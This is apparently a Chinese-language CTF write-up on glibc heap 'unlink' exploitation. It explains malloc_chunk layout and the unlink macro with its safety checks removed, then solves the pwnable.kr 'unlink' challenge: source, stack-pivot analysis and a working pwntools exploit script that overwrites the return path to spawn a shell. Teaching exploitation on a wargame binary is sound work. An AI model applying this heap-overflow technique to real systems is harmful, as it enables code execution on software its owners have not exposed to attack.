
# [原创]Glibc Heap 利用之初识 Unlink

## 0x0 malloc_chunk 详解

在 `Glibc` 管理堆的过程中，无论一个内存块（`chunk`）是处于已分配状态还是处于空闲状态，`Glibc` 都统一使用一个名为 `malloc_chunk` 的结构体对其进行描述（可以将其理解为 `chunk` 的 `header`），下图简单描绘了 `chunk` 在堆中的一个布局：

![图片描述](upload/attach/201901/93_25U96QW6FFWBMF9.png)

而关于 `malloc_chunk` 的具体内容，我们可以查阅 <a href="elink@6f0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6T1L8h3W2F1L8%4u0Q4x3V1k6Y4L8r3W2T1j5#2)9J5c8X3u0D9L8$3u0Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1k6E0j5h3I4D9L8$3y4Q4x3V1k6E0j5h3I4D9L8$3y4Q4x3X3g2U0">Glibc源码</a>中的 `mallo.c` 文件，如下所示：

```c
struct malloc_chunk {
INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free). */
INTERNAL_SIZE_T mchunk_size; /* Size in bytes, including overhead. */
struct malloc_chunk* fd; /* double links -- used only if free. */
struct malloc_chunk* bk;
/* Only used for large blocks: pointer to next larger size. */
struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
struct malloc_chunk* bk_nextsize;
};
```

`malloc_chunk` 中的各个字段对于已分配的块和空闲的块而言，是有着不同含义的：

- `mchunk_prev_size:` 如果当前 `chunk` 所相邻的上一个 `chunk` (地址较当前块低的)为空闲状态，该字段便会记录上个 `chunk` 的大小（包括 `chunk` 头）。若否，那该字段便会被上个 `chunk` 用来存储数据。
- `mchunk_size:` 该字段表示当前 `chunk` 的大小，在32位系统中，其大小最小不可低于16个字节，对齐则为8个字节。而在64位系统中，其大小不可低于32个字节，对其则为16个字节。
- `fd:` 在空闲的 `chunk` 中，指向前一个与之不相邻的空闲 `chunk`。在已分配的 `chunk` 中，该字段直接指向用户数据区。
- `bk:` （该字段只被空闲的 `chunk` 所使用）指向后一个与之不相邻的空闲 `chunk`。
- `fd_nextsize:` （该字段只会被空闲的 `large chunk` 所使用）指向前一个与当前 `chunk` 大小不同的空闲 `large chunk`。
- `bk_nextsize:` （该字段只会被空闲的 `large chunk` 所使用）指向后一个与当前 `chunk` 大小不同的空闲 `large chunk`.

空闲的 `chunk` 所对应的 `malloc_chunk` 结构体由 `glibc` 的内存管理器 `ptmalloc` 所管理，`ptmalloc` 会根据它们的大小和使用状态将它们保存到互不相关的链表中，而它们在堆中的结构大概是下面这样子的：

```
chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Size of previous chunk, if unallocated (P clear) |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
`head:' | Size of chunk, in bytes |A|0|P|
mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Forward pointer to next chunk in list |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Back pointer to previous chunk in list |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Unused space (may be 0 bytes long) .
. .
. |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
`foot:' | Size of chunk, in bytes |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Size of next chunk, in bytes |A|0|0|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

已分配的 `chunk` 在堆中的结构则是这个样子：

```
chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Size of previous chunk, if unallocated (P clear) |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Size of chunk, in bytes |A|M|P|
mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| User data starts here... .
. .
. (malloc_usable_size() bytes) .
. |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| (size of chunk, but used for application data) |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Size of next chunk, in bytes |A|0|1|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

## 0x1 Unlink 简单概述

简单来说，`unlink` 就是一个被 `ptmalloc` 用来提取双向链表（指上文中通过 `chunk` 头管理堆中空闲 `chunk` 的链表）中空闲 `chunk` 的操作。它的基本流程如下图所示：

![图片描述](upload/attach/201901/93_H37ZYHPESXPKP5D.png)

上图所示的过程，其实可以用下面几行代码来表示：

```c
FD = P -> fd
BK = P -> bk
FD -> bk = BK /* 相当于 (P -> fd -> bk = P -> bk) */
BK -> fd = FD /* 相当于 (P -> bk -> fd = P -> fd) */
```

不难看出，这样的操作是有一定风险的，倘若攻击者利用堆溢出覆盖了 `unlink` 对象的 `fd` 指针和 `bk` 指针，便会造成任意地址读写。在古老的 `unlink` 中的确有这个问题存在，因为它没有对 `unlink` 对象的相关字段进行检查，也就是说，它并没有下面代码中被注释掉的那部分内容：

```c
#define unlink(AV, P, BK, FD) { \
// if (___builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \
// malloc_printerr ("corrupted size vs. prev_size"); \
FD = P->fd; \
BK = P->bk; \
// if (___builtin_expect (FD->bk != P || BK->fd != P, 0)) \
// malloc_printerr ("corrupted double-linked list"); \
else { \
FD->bk = BK; \
BK->fd = FD; \
if (!in_smallbin_range (chunksize_nomask (P)) \
&& ___builtin_expect (P->fd_nextsize != NULL, 0)) { \
// if (___builtin_expect (P->fd_nextsize->bk_nextsize != P, 0) \
// || ___builtin_expect (P->bk_nextsize->fd_nextsize != P, 0)) \
// malloc_printerr ("corrupted double-linked list (not small)"); \
if (FD->fd_nextsize == NULL) { \
if (P->fd_nextsize == P) \
FD->fd_nextsize = FD->bk_nextsize = FD; \
else { \
FD->fd_nextsize = P->fd_nextsize; \
FD->bk_nextsize = P->bk_nextsize; \
P->fd_nextsize->bk_nextsize = FD; \
P->bk_nextsize->fd_nextsize = FD; \
} \
} else { \
P->fd_nextsize->bk_nextsize = P->bk_nextsize; \
P->bk_nextsize->fd_nextsize = P->fd_nextsize; \
} \
} \
} \
}
```

但即使是增加了对相关字段的检查，`unlink` 也不是绝对安全的，现在已经有不少绕过这些检测的方法，本文暂时不对这方面内容进行讨论，下面我们通过一道题来了解下古老 `unlink` 的利用方式。

## 0x2 pwnable.kr 之 Unlink 题解

这道题可以说是很好地复现了古老的 `unlink` 操作（<a href="elink@ecdK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4m8%4L8X3q4T1L8r3g2Q4x3X3g2C8M7W2)9J5c8Y4m8D9j5i4W2Q4x3X3g2H3K9s2l9`.">题目链接</a>），很适合用来了解 `unlink` 的原理，下面来分析分析它：

1. 先看题目源码，栈的地址和堆的地址皆已给出，利用点也很明确，也就是 `gets(A->buf)` 和 `unlink(B)` 这两个地方，所以利用流程大致上可以归结为：先通过堆溢出覆盖 `B` 的相关字段，再通过 `unlink` 函数实现任意地址读写，从而将主函数的返回地址写为 `shell` 函数的起始地址。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
typedef struct tagOBJ{
struct tagOBJ* fd;
struct tagOBJ* bk;
char buf[8];
}OBJ;
void shell(){
system("/bin/sh");
}
void unlink(OBJ* P){
OBJ* BK;
OBJ* FD;
BK=P->bk;
FD=P->fd;
FD->bk=BK;
BK->fd=FD;
}
int main(int argc, char* argv[]){
malloc(1024);
OBJ* A = (OBJ*)malloc(sizeof(OBJ));
OBJ* B = (OBJ*)malloc(sizeof(OBJ));
OBJ* C = (OBJ*)malloc(sizeof(OBJ));
// double linked list: A <-> B <-> C
A->fd = B;
B->bk = A;
B->fd = C;
C->bk = B;
printf("here is stack address leak: %p\n", &A);
printf("here is heap address leak: %p\n", A);
printf("now that you have leaks, get shell!\n");
// heap overflow!
gets(A->buf);
// exploit this unlink!
unlink(B);
return 0;
}
```

2. 在第一时间，很多人通常会想到将 `A` 和 `B` 构造成下面这个布局（`padding` 的大小之所以为16个字节，是因为32位系统下 `chunk` 的大小最小不低于16），然后通过 `FD->bk=BK` 将 `shell` 函数的起始地址写到返回地址上。但是这样做的话，到下一步执行 `BK->fd=FD` 时，程序会尝试向代码段上写入数据，这种非法写入将会引发错误，导致程序无法继续执行。

```
heapAddr+0x8 +-+-+-+-+-+-+-+-+-+-+-+
| padding (A->buf) |
heapAddr+0x18 +-+-+-+-+-+-+-+-+-+-+-+
| RetAddr-4 (B->fd) |
heapAddr+0x1C +-+-+-+-+-+-+-+-+-+-+-+
| shellAddr (B->bk) |
+-+-+-+-+-+-+-+-+-+-+-+
```

3. 既然遇到了瓶颈，那我们不妨去分析一下反汇编后的 `main` 函数，寻找新的突破口。最终在 `main` 函数的末尾，发现了可利用的地方，如下所示：

```asm
80485ff: 8b 4d fc mov -0x4(%ebp),%ecx; ecx = [ebp - 0x4]
8048602: c9 leave
8048603: 8d 61 fc lea -0x4(%ecx),%esp; esp = ecx - 0x4
8048606: c3 ret ;eip = [[ebp - 0x4] - 0x4]
```

于是我们可以把 `A` 和 `B` 的布局构造成下面这样（关于偏移量，可以通过分析汇编代码或者动态调试取得，这里就不多讲），这样构造既不会出现非法写入的情况，又使得我们可以借助 `BK->fd=FD` 让程序转去执行 `shell` 函数。

```
heapAddr+0x8 +-+-+-+-+-+-+-+-+-+-+-+
| shellAddr |
heapAddr+0xC +-+-+-+-+-+-+-+-+-+-+-+
| padding |
heapAddr+0x18 +-+-+-+-+-+-+-+-+-+-+-+
| heapAddr+0xC |
heapAddr+0x1C +-+-+-+-+-+-+-+-+-+-+-+
| stackAddr+0x10 |
+-+-+-+-+-+-+-+-+-+-+-+
```

4. 最终的利用代码如下所示：

```python
from pwn import *
p = ssh(host='pwnable.kr',
port=2222,
user='unlink',
password='guest'
).process("./unlink")
shell_addr = 0x080484eb
p.recvuntil("here is stack address leak: ")
stack_addr = int(p.recv(10),16)
p.recvuntil("here is heap address leak: ")
heap_addr = int(p.recv(9),16)
payload = p32(shell_addr) + 'A' * 12 + p32(heap_addr + 12) + p32(stack_addr + 16)
p.send(payload)
p.interactive()
```

本文部分内容参考于：

<mark class="encrypted">ba1K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6T1L8h3W2F1L8%4u0Q4x3V1k6Y4L8r3W2T1j5#2)9J5c8X3u0D9L8$3u0Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1k6E0j5h3I4D9L8$3y4Q4x3V1k6E0j5h3I4D9L8$3y4Q4x3X3g2U0</mark>
